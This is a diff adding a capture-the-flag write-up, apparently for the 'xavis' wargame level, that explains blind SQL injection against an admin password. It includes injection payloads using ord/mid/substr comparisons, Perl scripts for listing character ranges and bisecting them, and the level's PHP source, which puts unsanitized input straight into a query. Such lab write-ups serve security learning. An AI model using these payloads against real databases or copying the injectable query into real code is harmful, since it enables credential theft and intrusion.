@@ -1,0 +1,109 @@
+50864
+50773
+
+So, admin's pw is no ascii.
+
+verify query : query : select id from prob_xavis where id='admin' and
+pw=''||ord(mid(pw,1,1)) BETWEEN X AND Y && id='admin'
+
+where X and Y are characters range. Use this script for the info:
+
+=====================================================================
+#!/usr/bin/perl -l
+use utf8;
+use open qw(:std :utf8);
+
+sub eng {
+        # 94 total possible chars
+        print(chr) for 32 .. 126;
+}
+
+sub kor {
+        # 11272 total possible chars
+        print(chr) for 32 .. 64;
+        print(chr) for 91 .. 96;
+        print(chr) for 123 .. 126;
+        print(chr) for 12593 .. 12642;
+        print(chr) for 44032 .. 55215;
+}
+
+sub rus {
+        # 103 total possible chars
+        print(chr) for 32 .. 64;
+        print(chr) for 91 .. 96;
+        print(chr) for 123 .. 126;
+        print(chr) for 1040 .. 1103;
+}
+
+sub cj {
+        # 1078 total chars
+        print(chr) for 32 .. 64;
+        print(chr) for 91 .. 96;
+        print(chr) for 123 .. 126;
+        print(chr) for 19968 .. 21006;
+}
+
+&eng    if $ARGV[0] eq 'eng';
+&kor    if $ARGV[0] eq 'kor';
+&rus    if $ARGV[0] eq 'rus';
+&cj     if $ARGV[0] eq 'cj';
+
+die "Usage: $0 [eng|kor|rus|cj]\n"
+        if $ARGV[0] =~ /\-\-?(?:h(?:elp))/ or !@ARGV;
+
+# End of file.
+=====================================================================
+
+For more convenience to find the ranges, use langrange.pl:
+
+#!/usr/bin/perl -l
+die "usage: $0 <from> <to> <left|right>\n"
+        unless @ARGV || @ARGV > 3;
+
+($from, $to, $pos, $int) = @ARGV;
+
+die "from > to\n" if $from > $to;
+
+while (1) {
+        $x = ($to - $from) / 2;
+        last if $from == $from + $x;
+
+        print "$from .. " . ($from + $x) . " .. $to";
+
+        if ($pos eq "left") {
+                $to = $from + $x;
+        } else {
+                $from = $from + $x;
+        }
+}
+====================================================================
+
+For example:
+
+# korean
+perl -Minteger langrange.pl 44032 55215 left
+
+Next, when we found a range, lets brute the password:
+
+brute query : select id from prob_xavis where id='admin' and pw=''||ord(substr(pw,1,1))=X && id='admin'
+
+Next, convert matched numbers to string: ./ord2str.pl [num...]
+
+Hello admin
+<?php 
+  include "./config.php"; 
+  login_chk(); 
+  $db = dbconnect(); 
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
+  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
+  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
+  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
+  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
+   
+  $_GET[pw] = addslashes($_GET[pw]); 
+  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
+  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
+  highlight_file(__FILE__); 
+?>
